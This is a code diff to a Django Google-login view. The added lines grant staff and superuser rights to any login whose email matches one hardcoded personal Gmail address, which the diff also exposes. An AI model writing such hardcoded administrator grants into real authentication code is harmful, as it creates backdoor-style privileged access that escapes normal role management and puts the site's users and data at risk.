@@ -53,6 +53,12 @@ class GoogleLoginView(APIView):
             user.is_verified = True
             if created:
                 user.set_unusable_password()
+
+            # Ensure platform administrator privileges
+            if email.lower() == "ashenafi.deresa.cse@gmail.com":
+                user.is_staff = True
+                user.is_superuser = True
+
             user.save()
 
             # Ensure profile has the user's name if provided by Google
